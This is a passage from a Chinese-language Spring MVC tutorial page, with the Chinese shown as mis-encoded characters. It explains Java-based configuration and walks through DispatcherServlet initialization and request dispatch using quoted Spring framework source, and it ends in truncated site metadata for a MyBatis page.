springæä¾äºè¿ä¸ªæ¥å£çå®ç°ï¼åä¸ºspringservletcontainerinitializerï¼è¿ä¸ªç±»åè¿æ¥åä¼æ¥æ¾å®ç°webapplicationinitializerçç±»å¹¶å°éç½®çä»»å¡äº¤ç»å®ä»¬æ¥å®æãspring3.2å¼å¥äºä¸ä¸ªä¾¿å©çwebapplicationinitializeråºç¡å®ç°ï¼åä¸ºabstractannotationconfigdispatcherservletinitializerï¼å½æä»¬çç±»æ©å±äºabstractannotationconfigdispatcherservletinitializerå¹¶å°å¶é¨ç½²å°servlet3.0å®¹å¨çæ¶åï¼å®¹å¨ä¼èªå¨åç°å®ï¼å¹¶ç¨å®æ¥éç½®servletä¸ä¸æã\n\npublic class webinit extends abstractannotationconfigdispatcherservletinitializer {\n\n    /**\n     * æå®springçéç½®ç±»\n     * @return\n     */\n    @override\n    protected class<?>[] getrootconfigclasses() {\n        return new class[]{springconfig.class};\n    }\n\n    /**\n     * æå®springmvcçéç½®ç±»\n     * @return\n     */\n    @override\n    protected class<?>[] getservletconfigclasses() {\n        return new class[]{webconfig.class};\n    }\n\n    /**\n     * æå®dispatcherservletçæ å°è§åï¼å³url-pattern\n     * @return\n     */\n    @override\n    protected string[] getservletmappings() {\n        return new string[]{"/"};\n    }\n\n    /**\n     * æ·»å è¿æ»¤å¨\n     * @return\n     */\n    @override\n    protected filter[] getservletfilters() {\n        characterencodingfilter encodingfilter = new characterencodingfilter();\n        encodingfilter.setencoding("utf-8");\n        encodingfilter.setforcerequestencoding(true);\n        hiddenhttpmethodfilter hiddenhttpmethodfilter = new hiddenhttpmethodfilter();\n        return new filter[]{encodingfilter, hiddenhttpmethodfilter};\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n 2. åå»ºspringconfigéç½®ç±»ï¼ä»£æ¿springçéç½®æä»¶\n\n@configuration\npublic class springconfig {\n    //ssmæ´åä¹åï¼springçéç½®ä¿¡æ¯åå¨æ­¤ç±»ä¸­\n}\n\n\n1\n2\n3\n4\n\n 3. åå»ºwebconfigéç½®ç±»ï¼ä»£æ¿springmvcçéç½®æä»¶\n\n@configuration\n//æ«æç»ä»¶\n@componentscan("com.atguigu.mvc.controller")\n//å¼å¯mvcæ³¨è§£é©±å¨\n@enablewebmvc\npublic class webconfig implements webmvcconfigurer {\n\n    //ä½¿ç¨é»è®¤çservletå¤çéæèµæº\n    @override\n    public void configuredefaultservlethandling(defaultservlethandlerconfigurer configurer) {\n        configurer.enable();\n    }\n\n    //éç½®æä»¶ä¸ä¼ è§£æå¨\n    @bean\n    public commonsmultipartresolver multipartresolver(){\n        return new commonsmultipartresolver();\n    }\n\n    //éç½®æ¦æªå¨\n    @override\n    public void addinterceptors(interceptorregistry registry) {\n        firstinterceptor firstinterceptor = new firstinterceptor();\n        registry.addinterceptor(firstinterceptor).addpathpatterns("/**");\n    }\n\n    //éç½®è§å¾æ§å¶\n\n    /*@override\n    public void addviewcontrollers(viewcontrollerregistry registry) {\n        registry.addviewcontroller("/").setviewname("index");\n    }*/\n\n    //éç½®å¼å¸¸æ å°\n    /*@override\n    public void configurehandlerexceptionresolvers(list<handlerexceptionresolver> resolvers) {\n        simplemappingexceptionresolver exceptionresolver = new simplemappingexceptionresolver();\n        properties prop = new properties();\n        prop.setproperty("java.lang.arithmeticexception", "error");\n        //è®¾ç½®å¼å¸¸æ å°\n        exceptionresolver.setexceptionmappings(prop);\n        //è®¾ç½®å±äº«å¼å¸¸ä¿¡æ¯çé®\n        exceptionresolver.setexceptionattribute("ex");\n        resolvers.add(exceptionresolver);\n    }*/\n\n    //éç½®çææ¨¡æ¿è§£æå¨\n    @bean\n    public itemplateresolver templateresolver() {\n        webapplicationcontext webapplicationcontext = contextloader.getcurrentwebapplicationcontext();\n        // servletcontexttemplateresolveréè¦ä¸ä¸ªservletcontextä½ä¸ºæé åæ°ï¼å¯éè¿webapplicationcontext çæ¹æ³è·å¾\n        servletcontexttemplateresolver templateresolver = new servletcontexttemplateresolver(\n                webapplicationcontext.getservletcontext());\n        templateresolver.setprefix("/web-inf/templates/");\n        templateresolver.setsuffix(".html");\n        templateresolver.setcharacterencoding("utf-8");\n        templateresolver.settemplatemode(templatemode.html);\n        return templateresolver;\n    }\n\n    //çææ¨¡æ¿å¼æå¹¶ä¸ºæ¨¡æ¿å¼ææ³¨å¥æ¨¡æ¿è§£æå¨\n    @bean\n    public springtemplateengine templateengine(itemplateresolver templateresolver) {\n        springtemplateengine templateengine = new springtemplateengine();\n        templateengine.settemplateresolver(templateresolver);\n        return templateengine;\n    }\n\n    //çæè§å¾è§£æå¨å¹¶æªè§£æå¨æ³¨å¥æ¨¡æ¿å¼æ\n    @bean\n    public viewresolver viewresolver(springtemplateengine templateengine) {\n        thymeleafviewresolver viewresolver = new thymeleafviewresolver();\n        viewresolver.setcharacterencoding("utf-8");\n        viewresolver.settemplateengine(templateengine);\n        return viewresolver;\n    }\n\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n\n\n\n# springmvcæ§è¡æµç¨\n\n\n# springmvcå¸¸ç¨ç»ä»¶\n\ndispatcherservletï¼åç«¯æ§å¶å¨ï¼ä¸éè¦å·¥ç¨å¸å¼åï¼ç±æ¡æ¶æä¾ ä½ç¨ï¼ç»ä¸å¤çè¯·æ±åååºï¼æ´ä¸ªæµç¨æ§å¶çä¸­å¿ï¼ç±å®è°ç¨å¶å®ç»ä»¶å¤çç¨æ·çè¯·æ± handlermappingï¼å¤çå¨æ å°å¨ï¼ä¸éè¦å·¥ç¨å¸å¼åï¼ç±æ¡æ¶æä¾ ä½ç¨ï¼æ ¹æ®è¯·æ±çurlãmethodç­ä¿¡æ¯æ¥æ¾handlerï¼å³æ§å¶å¨æ¹æ³ handlerï¼å¤çå¨ï¼éè¦å·¥ç¨å¸å¼å ä½ç¨ï¼å¨dispatcherservletçæ§å¶ä¸handlerå¯¹å·ä½çç¨æ·è¯·æ±è¿è¡å¤ç handleradapterï¼å¤çå¨ééå¨ï¼ä¸éè¦å·¥ç¨å¸å¼åï¼ç±æ¡æ¶æä¾ ä½ç¨ï¼éè¿handleradapterå¯¹å¤çå¨ï¼æ§å¶å¨æ¹æ³ï¼è¿è¡æ§è¡ viewresolverï¼è§å¾è§£æå¨ï¼ä¸éè¦å·¥ç¨å¸å¼åï¼ç±æ¡æ¶æä¾ ä½ç¨ï¼è¿è¡è§å¾è§£æï¼å¾å°ç¸åºçè§å¾ï¼ä¾å¦ï¼thymeleafviewãinternalresourceviewãredirectview viewï¼è§å¾ ä½ç¨ï¼å°æ¨¡åæ°æ®éè¿é¡µé¢å±ç¤ºç»ç¨æ·\n\n\n# dispatcherservletåå§åè¿ç¨\n\ndispatcherservlet æ¬è´¨ä¸æ¯ä¸ä¸ª servletï¼æä»¥å¤©ç¶çéµå¾ª servlet ççå½å¨æãæä»¥å®è§ä¸æ¯ servlet çå½å¨ææ¥è¿è¡è°åº¦ã\n\n\n\n\n# åå§åwebapplicationcontext\n\næå¨ç±»ï¼org.springframework.web.servlet.frameworkservlet\n\nprotected webapplicationcontext initwebapplicationcontext() {\n    webapplicationcontext rootcontext =\n        webapplicationcontextutils.getwebapplicationcontext(getservletcontext());\n    webapplicationcontext wac = null;\n\n    if (this.webapplicationcontext != null) {\n        // a context instance was injected at construction time -> use it\n        wac = this.webapplicationcontext;\n        if (wac instanceof configurablewebapplicationcontext) {\n            configurablewebapplicationcontext cwac = (configurablewebapplicationcontext) wac;\n            if (!cwac.isactive()) {\n                // the context has not yet been refreshed -> provide services such as\n                // setting the parent context, setting the application context id, etc\n                if (cwac.getparent() == null) {\n                    // the context instance was injected without an explicit parent -> set\n                    // the root application context (if any; may be null) as the parent\n                    cwac.setparent(rootcontext);\n                }\n                configureandrefreshwebapplicationcontext(cwac);\n            }\n        }\n    }\n    if (wac == null) {\n        // no context instance was injected at construction time -> see if one\n        // has been registered in the servlet context. if one exists, it is assumed\n        // that the parent context (if any) has already been set and that the\n        // user has performed any initialization such as setting the context id\n        wac = findwebapplicationcontext();\n    }\n    if (wac == null) {\n        // no context instance is defined for this servlet -> create a local one\n        // åå»ºwebapplicationcontext\n        wac = createwebapplicationcontext(rootcontext);\n    }\n\n    if (!this.refresheventreceived) {\n        // either the context is not a configurableapplicationcontext with refresh\n        // support or the context injected at construction time had already been\n        // refreshed -> trigger initial onrefresh manually here.\n        synchronized (this.onrefreshmonitor) {\n            // å·æ°webapplicationcontext\n            onrefresh(wac);\n        }\n    }\n\n    if (this.publishcontext) {\n        // publish the context as a servlet context attribute.\n        // å°iocå®¹å¨å¨åºç¨åå±äº«\n        string attrname = getservletcontextattributename();\n        getservletcontext().setattribute(attrname, wac);\n    }\n\n    return wac;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n\n# åå»ºwebapplicationcontext\n\næå¨ç±»ï¼org.springframework.web.servlet.frameworkservlet\n\nprotected webapplicationcontext createwebapplicationcontext(@nullable applicationcontext parent) {\n    class<?> contextclass = getcontextclass();\n    if (!configurablewebapplicationcontext.class.isassignablefrom(contextclass)) {\n        throw new applicationcontextexception(\n            "fatal initialization error in servlet with name \'" + getservletname() +\n            "\': custom webapplicationcontext class [" + contextclass.getname() +\n            "] is not of type configurablewebapplicationcontext");\n    }\n    // éè¿åå°åå»º ioc å®¹å¨å¯¹è±¡\n    configurablewebapplicationcontext wac =\n        (configurablewebapplicationcontext) beanutils.instantiateclass(contextclass);\n\n    wac.setenvironment(getenvironment());\n    // è®¾ç½®ç¶å®¹å¨\n    wac.setparent(parent);\n    string configlocation = getcontextconfiglocation();\n    if (configlocation != null) {\n        wac.setconfiglocation(configlocation);\n    }\n    configureandrefreshwebapplicationcontext(wac);\n\n    return wac;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# dispatcherservletåå§åç­ç¥\n\nframeworkservletåå»ºwebapplicationcontextåï¼å·æ°å®¹å¨ï¼è°ç¨onrefresh(wac)ï¼æ­¤æ¹æ³å¨dispatcherservletä¸­è¿è¡äºéåï¼è°ç¨äºinitstrategies(context)æ¹æ³ï¼åå§åç­ç¥ï¼å³åå§ådispatcherservletçåä¸ªç»ä»¶ æå¨ç±»ï¼org.springframework.web.servlet.dispatcherservlet\n\nprotected void initstrategies(applicationcontext context) {\n   initmultipartresolver(context);\n   initlocaleresolver(context);\n   initthemeresolver(context);\n   inithandlermappings(context);\n   inithandleradapters(context);\n   inithandlerexceptionresolvers(context);\n   initrequesttoviewnametranslator(context);\n   initviewresolvers(context);\n   initflashmapmanager(context);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# dispatcherservletè°ç¨ç»ä»¶å¤çè¯·æ±\n\n# processrequest()\n\nframeworkservletéåhttpservletä¸­çservice()ådoxxx()ï¼è¿äºæ¹æ³ä¸­è°ç¨äºprocessrequest(request, response) æå¨ç±»ï¼org.springframework.web.servlet.frameworkservlet\n\nprotected final void processrequest(httpservletrequest request, httpservletresponse response)\n    throws servletexception, ioexception {\n\n    long starttime = system.currenttimemillis();\n    throwable failurecause = null;\n\n    localecontext previouslocalecontext = localecontextholder.getlocalecontext();\n    localecontext localecontext = buildlocalecontext(request);\n\n    requestattributes previousattributes = requestcontextholder.getrequestattributes();\n    servletrequestattributes requestattributes = buildrequestattributes(request, response, previousattributes);\n\n    webasyncmanager asyncmanager = webasyncutils.getasyncmanager(request);\n    asyncmanager.registercallableinterceptor(frameworkservlet.class.getname(), new requestbindinginterceptor());\n\n    initcontextholders(request, localecontext, requestattributes);\n\n    try {\n        // æ§è¡æå¡ï¼doservice()æ¯ä¸ä¸ªæ½è±¡æ¹æ³ï¼å¨dispatcherservletä¸­è¿è¡äºéå\n        doservice(request, response);\n    }\n    catch (servletexception | ioexception ex) {\n        failurecause = ex;\n        throw ex;\n    }\n    catch (throwable ex) {\n        failurecause = ex;\n        throw new nestedservletexception("request processing failed", ex);\n    }\n\n    finally {\n        resetcontextholders(request, previouslocalecontext, previousattributes);\n        if (requestattributes != null) {\n            requestattributes.requestcompleted();\n        }\n        logresult(request, response, failurecause, asyncmanager);\n        publishrequesthandledevent(request, response, starttime, failurecause);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n# doservice()\n\næå¨ç±»ï¼org.springframework.web.servlet.dispatcherservlet\n\n@override\nprotected void doservice(httpservletrequest request, httpservletresponse response) throws exception {\n    logrequest(request);\n\n    // keep a snapshot of the request attributes in case of an include,\n    // to be able to restore the original attributes after the include.\n    map<string, object> attributessnapshot = null;\n    if (webutils.isincluderequest(request)) {\n        attributessnapshot = new hashmap<>();\n        enumeration<?> attrnames = request.getattributenames();\n        while (attrnames.hasmoreelements()) {\n            string attrname = (string) attrnames.nextelement();\n            if (this.cleanupafterinclude || attrname.startswith(default_strategies_prefix)) {\n                attributessnapshot.put(attrname, request.getattribute(attrname));\n            }\n        }\n    }\n\n    // make framework objects available to handlers and view objects.\n    request.setattribute(web_application_context_attribute, getwebapplicationcontext());\n    request.setattribute(locale_resolver_attribute, this.localeresolver);\n    request.setattribute(theme_resolver_attribute, this.themeresolver);\n    request.setattribute(theme_source_attribute, getthemesource());\n\n    if (this.flashmapmanager != null) {\n        flashmap inputflashmap = this.flashmapmanager.retrieveandupdate(request, response);\n        if (inputflashmap != null) {\n            request.setattribute(input_flash_map_attribute, collections.unmodifiablemap(inputflashmap));\n        }\n        request.setattribute(output_flash_map_attribute, new flashmap());\n        request.setattribute(flash_map_manager_attribute, this.flashmapmanager);\n    }\n\n    requestpath requestpath = null;\n    if (this.parserequestpath && !servletrequestpathutils.hasparsedrequestpath(request)) {\n        requestpath = servletrequestpathutils.parseandcache(request);\n    }\n\n    try {\n        // å¤çè¯·æ±åååº\n        dodispatch(request, response);\n    }\n    finally {\n        if (!webasyncutils.getasyncmanager(request).isconcurrenthandlingstarted()) {\n            // restore the original attribute snapshot, in case of an include.\n            if (attributessnapshot != null) {\n                restoreattributesafterinclude(request, attributessnapshot);\n            }\n        }\n        if (requestpath != null) {\n            servletrequestpathutils.clearparsedrequestpath(request);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n# dodispatch()\n\næå¨ç±»ï¼org.springframework.web.servlet.dispatcherservlet\n\nprotected void dodispatch(httpservletrequest request, httpservletresponse response) throws exception {\n    httpservletrequest processedrequest = request;\n    handlerexecutionchain mappedhandler = null;\n    boolean multipartrequestparsed = false;\n\n    webasyncmanager asyncmanager = webasyncutils.getasyncmanager(request);\n\n    try {\n        modelandview mv = null;\n        exception dispatchexception = null;\n\n        try {\n            processedrequest = checkmultipart(request);\n            multipartrequestparsed = (processedrequest != request);\n\n            // determine handler for the current request.\n            /*\n                mappedhandlerï¼è°ç¨é¾\n                åå«handlerãinterceptorlistãinterceptorindex\n                handlerï¼æµè§å¨åéçè¯·æ±æå¹éçæ§å¶å¨æ¹æ³\n                interceptorlistï¼å¤çæ§å¶å¨æ¹æ³çæææ¦æªå¨éå\n                interceptorindexï¼æ¦æªå¨ç´¢å¼ï¼æ§å¶æ¦æªå¨aftercompletion()çæ§è¡\n            */\n            mappedhandler = gethandler(processedrequest);\n            if (mappedhandler == null) {\n                nohandlerfound(processedrequest, response);\n                return;\n            }\n\n            // determine handler adapter for the current request.\n               // éè¿æ§å¶å¨æ¹æ³åå»ºç¸åºçå¤çå¨ééå¨ï¼è°ç¨æå¯¹åºçæ§å¶å¨æ¹æ³\n            handleradapter ha = gethandleradapter(mappedhandler.gethandler());\n\n            // process last-modified header, if supported by the handler.\n            string method = request.getmethod();\n            boolean isget = "get".equals(method);\n            if (isget || "head".equals(method)) {\n                long lastmodified = ha.getlastmodified(request, mappedhandler.gethandler());\n                if (new servletwebrequest(request, response).checknotmodified(lastmodified) && isget) {\n                    return;\n                }\n            }\n\n            // è°ç¨æ¦æªå¨çprehandle()\n            if (!mappedhandler.applyprehandle(processedrequest, response)) {\n                return;\n            }\n\n            // actually invoke the handler.\n            // ç±å¤çå¨ééå¨è°ç¨å·ä½çæ§å¶å¨æ¹æ³ï¼æç»è·å¾modelandviewå¯¹è±¡\n            mv = ha.handle(processedrequest, response, mappedhandler.gethandler());\n\n            if (asyncmanager.isconcurrenthandlingstarted()) {\n                return;\n            }\n\n            applydefaultviewname(processedrequest, mv);\n            // è°ç¨æ¦æªå¨çposthandle()\n            mappedhandler.applyposthandle(processedrequest, response, mv);\n        }\n        catch (exception ex) {\n            dispatchexception = ex;\n        }\n        catch (throwable err) {\n            // as of 4.3, we\'re processing errors thrown from handler methods as well,\n            // making them available for @exceptionhandler methods and other scenarios.\n            dispatchexception = new nestedservletexception("handler dispatch failed", err);\n        }\n        // åç»­å¤çï¼å¤çæ¨¡åæ°æ®åæ¸²æè§å¾\n        processdispatchresult(processedrequest, response, mappedhandler, mv, dispatchexception);\n    }\n    catch (exception ex) {\n        triggeraftercompletion(processedrequest, response, mappedhandler, ex);\n    }\n    catch (throwable err) {\n        triggeraftercompletion(processedrequest, response, mappedhandler,\n                               new nestedservletexception("handler processing failed", err));\n    }\n    finally {\n        if (asyncmanager.isconcurrenthandlingstarted()) {\n            // instead of posthandle and aftercompletion\n            if (mappedhandler != null) {\n                mappedhandler.applyafterconcurrenthandlingstarted(processedrequest, response);\n            }\n        }\n        else {\n            // clean up any resources used by a multipart request.\n            if (multipartrequestparsed) {\n                cleanupmultipart(processedrequest);\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n\n\n# processdispatchresult()\n\nprivate void processdispatchresult(httpservletrequest request, httpservletresponse response,\n                                   @nullable handlerexecutionchain mappedhandler, @nullable modelandview mv,\n                                   @nullable exception exception) throws exception {\n\n    boolean errorview = false;\n\n    if (exception != null) {\n        if (exception instanceof modelandviewdefiningexception) {\n            logger.debug("modelandviewdefiningexception encountered", exception);\n            mv = ((modelandviewdefiningexception) exception).getmodelandview();\n        }\n        else {\n            object handler = (mappedhandler != null ? mappedhandler.gethandler() : null);\n            mv = processhandlerexception(request, response, handler, exception);\n            errorview = (mv != null);\n        }\n    }\n\n    // did the handler return a view to render?\n    if (mv != null && !mv.wascleared()) {\n        // å¤çæ¨¡åæ°æ®åæ¸²æè§å¾\n        render(mv, request, response);\n        if (errorview) {\n            webutils.clearerrorrequestattributes(request);\n        }\n    }\n    else {\n        if (logger.istraceenabled()) {\n            logger.trace("no view rendering, null modelandview returned.");\n        }\n    }\n\n    if (webasyncutils.getasyncmanager(request).isconcurrenthandlingstarted()) {\n        // concurrent handling started during a forward\n        return;\n    }\n\n    if (mappedhandler != null) {\n        // exception (if any) is already handled..\n        // è°ç¨æ¦æªå¨çaftercompletion()\n        mappedhandler.triggeraftercompletion(request, response, null);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# springmvcçæ§è¡æµç¨\n\nç¨æ·åæå¡å¨åéè¯·æ±ï¼è¯·æ±è¢«springmvc åç«¯æ§å¶å¨ dispatcherservletæè·ã dispatcherservletå¯¹è¯·æ±urlè¿è¡è§£æï¼å¾å°è¯·æ±èµæºæ è¯ç¬¦ï¼uriï¼ï¼å¤æ­è¯·æ±uriå¯¹åºçæ å°ï¼\n\n 1. ä¸å­å¨ i. åå¤æ­æ¯å¦éç½®äºmvc:default-servlet-handler ii. å¦ææ²¡éç½®ï¼åæ§å¶å°æ¥æ å°æ¥æ¾ä¸å°ï¼å®¢æ·ç«¯å±ç¤º404éè¯¯\n\n\n\niii. å¦ææéç½®ï¼åè®¿é®ç®æ èµæºï¼ä¸è¬ä¸ºéæèµæºï¼å¦ï¼js,css,htmlï¼ï¼æ¾ä¸å°å®¢æ·ç«¯ä¹ä¼å±ç¤º404éè¯¯\n\n\n\n 2. å­å¨åæ§è¡ä¸é¢çæµç¨\n    \n    æ ¹æ®è¯¥uriï¼è°ç¨handlermappingè·å¾è¯¥handleréç½®çææç¸å³çå¯¹è±¡ï¼åæ¬handlerå¯¹è±¡ä»¥åhandlerå¯¹è±¡å¯¹åºçæ¦æªå¨ï¼ï¼æåä»¥handlerexecutionchainæ§è¡é¾å¯¹è±¡çå½¢å¼è¿åã\n    \n    dispatcherservlet æ ¹æ®è·å¾çhandlerï¼éæ©ä¸ä¸ªåéçhandleradapterã\n    \n    å¦ææåè·å¾handleradapterï¼æ­¤æ¶å°å¼å§æ§è¡æ¦æªå¨çprehandler(â¦)æ¹æ³ãæ­£åã\n    \n    æårequestä¸­çæ¨¡åæ°æ®ï¼å¡«åhandlerå¥åï¼å¼å§æ§è¡handlerï¼controller)æ¹æ³ï¼å¤çè¯·æ±ãå¨å¡«åhandlerçå¥åè¿ç¨ä¸­ï¼æ ¹æ®ä½ çéç½®ï¼springå°å¸®ä½ åä¸äºé¢å¤çå·¥ä½ï¼\n    \n    a) httpmessageconveterï¼ å°è¯·æ±æ¶æ¯ï¼å¦jsonãxmlç­æ°æ®ï¼è½¬æ¢æä¸ä¸ªå¯¹è±¡ï¼å°å¯¹è±¡è½¬æ¢ä¸ºæå®çååºä¿¡æ¯\n    \n    b) æ°æ®è½¬æ¢ï¼å¯¹è¯·æ±æ¶æ¯è¿è¡æ°æ®è½¬æ¢ãå¦stringè½¬æ¢æintegerãdoubleç­\n    \n    c) æ°æ®æ ¼å¼åï¼å¯¹è¯·æ±æ¶æ¯è¿è¡æ°æ®æ ¼å¼åã å¦å°å­ç¬¦ä¸²è½¬æ¢ææ ¼å¼åæ°å­ææ ¼å¼åæ¥æç­\n    \n    d) æ°æ®éªè¯ï¼ éªè¯æ°æ®çæææ§ï¼é¿åº¦ãæ ¼å¼ç­ï¼ï¼éªè¯ç»æå­å¨å°bindingresultæerrorä¸­\n    \n    handleræ§è¡å®æåï¼ådispatcherservlet è¿åä¸ä¸ªmodelandviewå¯¹è±¡ã\n    \n    æ­¤æ¶å°å¼å§æ§è¡æ¦æªå¨çposthandle(...)æ¹æ³ãéåãã\n    \n    æ ¹æ®è¿åçmodelandviewï¼æ­¤æ¶ä¼å¤æ­æ¯å¦å­å¨å¼å¸¸ï¼å¦æå­å¨å¼å¸¸ï¼åæ§è¡handlerexceptionresolverè¿è¡å¼å¸¸å¤çï¼éæ©ä¸ä¸ªéåçviewresolverè¿è¡è§å¾è§£æï¼æ ¹æ®modelåviewï¼æ¥æ¸²æè§å¾ã\n    \n    æ¸²æè§å¾å®æ¯æ§è¡æ¦æªå¨çaftercompletion(â¦)æ¹æ³ãéåãã\n    \n    å°æ¸²æç»æè¿åç»å®¢æ·ç«¯ã',charsets:{cjk:!0},lastUpdated:"2022/05/16, 15:55:31",lastUpdatedTimestamp:1652716531e3},{title:"MyBatis",frontmatter:{title:"MyBatis",date:"2022-01-11T00:00:00.000Z",permalink:"/dev/java/core/mybatis",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡æ ¸å¿"],tags:["SSM","Mabatis"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1011.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A0%B8%E5%BF%83/02.Mybatis.html",relativePath:"01.å¼å/101.åç«¯/1011.å¾®æå¡æ ¸å¿/02.Mybatis.md",key:"v-18fb999c",path:"/dev/java/core/mybatis/",headers:[{level:2,title:"MyBatisç®ä»",slug:"mybatisç®ä»",normalizedTitle:"mybatisç®ä»",charIndex:14},{level:2,title:"MyBatisDemoé¡¹ç®",slug:"mybatisdemoé¡¹ç®",normalizedTitle:"mybatisdemoé¡¹ç®",charIndex:268},{level:3,title:"èæ¹æ³",slug:"èæ¹æ³",normalizedTitle:"èæ¹æ³",charIndex:286},{level:3,title:"æ¥å£å¼ç¼ç¨æ¹å¼",slug:"æ¥å£å¼ç¼ç¨æ¹å¼",normalizedTitle:"æ¥å£å¼ç¼ç¨æ¹å¼",charIndex:5276},{level:2,title:"MyBatiséç½®æä»¶",slug:"mybatiséç½®æä»¶",normalizedTitle:"mybatiséç½®æä»¶",charIndex:6286},{level:3,title:"properties æ ç­¾",slug:"properties-æ ç­¾",normalizedTitle:"properties æ ç­¾",charIndex:6302},{level:3,title:"settings æ ç­¾",slug:"settings-æ ç­¾",normalizedTitle:"settings æ ç­¾",charIndex:7656},{level:3,title:"typeAliases å«åå¤çå¨",slug:"typealiases-å«åå¤çå¨",normalizedTitle:"typealiases å«åå¤çå¨",charIndex:8055},{level:3,title:"typeHandlers",slug:"typehandlers",normalizedTitle:"typehandlers",charIndex:8676},{level:3,title:"plugins",slug:"plugins",normalizedTitle:"plugins",charIndex:8823},{level:3,title:"environments",slug:"environments",normalizedTitle:"environments",charIndex:1590},{level:3,title:"databaseIdProvider",slug:"databaseidprovider",normalizedTitle:"databaseidprovider",charIndex:10308},{level:3,title:"mappers",slug:"mappers",normalizedTitle:"mappers",charIndex:2008},{level:2,title:"Mapperæ å°æä»¶",slug:"mapperæ å°æä»¶",normalizedTitle:"mapperæ å°æä»¶",charIndex:11912},{level:3,title:"å¢å æ¹æ¥",slug:"å¢å æ¹æ¥",normalizedTitle:"å¢å æ¹æ¥",charIndex:12236},{level:3,title:"ä¼ å¥åæ°å¤ç",slug:"ä¼ å¥åæ°å¤ç",normalizedTitle:"ä¼ å¥åæ°å¤ç",charIndex:13792},{level:3,title:"æ¥è¯¢ç»æè¿å",slug:"æ¥è¯¢ç»æè¿å",normalizedTitle:"æ¥è¯¢ç»æè¿å",charIndex:14164},{level:3,title:"å°è£è¿åç»æ",slug:"å°è£è¿åç»æ",normalizedTitle:"å°è£è¿åç»æ",charIndex:14725},{level:3,title:"èåæ¥è¯¢çç»æè¿å",slug:"èåæ¥è¯¢çç»æè¿å",normalizedTitle:"èåæ¥è¯¢çç»æè¿å",charIndex:15290},{level:3,title:"èåæ¥è¯¢çéåç»æè¿å",slug:"èåæ¥è¯¢çéåç»æè¿å",normalizedTitle:"èåæ¥è¯¢çéåç»æè¿å",charIndex:20317},{level:3,title:"å¤åstepæ¥è¯¢",slug:"å¤åstepæ¥è¯¢",normalizedTitle:"å¤åstepæ¥è¯¢",charIndex:21594},{level:3,title:"å³äºå»¶è¿å è½½",slug:"å³äºå»¶è¿å è½½",normalizedTitle:"å³äºå»¶è¿å è½½",charIndex:21685},{level:3,title:"é´å«å¨",slug:"é´å«å¨",normalizedTitle:"é´å«å¨",charIndex:21772},{level:2,title:"å¨æSQLè¯­å¥",slug:"å¨æsqlè¯­å¥",normalizedTitle:"å¨æsqlè¯­å¥",charIndex:22515},{level:3,title:"ifæ ç­¾",slug:"ifæ ç­¾",normalizedTitle:"ifæ ç­¾",charIndex:22588},{level:3,title:"whereæ ç­¾",slug:"whereæ ç­¾",normalizedTitle:"whereæ ç­¾",charIndex:23057},{level:3,title:"trimæ ç­¾",slug:"trimæ ç­¾",normalizedTitle:"trimæ ç­¾",charIndex:24504},{level:3,title:"chooseæ ç­¾",slug:"chooseæ ç­¾",normalizedTitle:"chooseæ ç­¾",charIndex:25214},{level:3,title:"setæ ç­¾",slug:"setæ ç­¾",normalizedTitle:"setæ ç­¾",charIndex:25742},{level:3,title:"foreachæ ç­¾",slug:"foreachæ ç­¾",normalizedTitle:"foreachæ ç­¾",charIndex:26953},{level:3,title:"ä¸¤ä¸ªåç½®åæ°",slug:"ä¸¤ä¸ªåç½®åæ°",normalizedTitle:"ä¸¤ä¸ªåç½®åæ°",charIndex:28078},{level:3,title:"bindæ ç­¾",slug:"bindæ ç­¾",normalizedTitle:"bindæ ç­¾",charIndex:28397},{level:3,title:"sqlæ 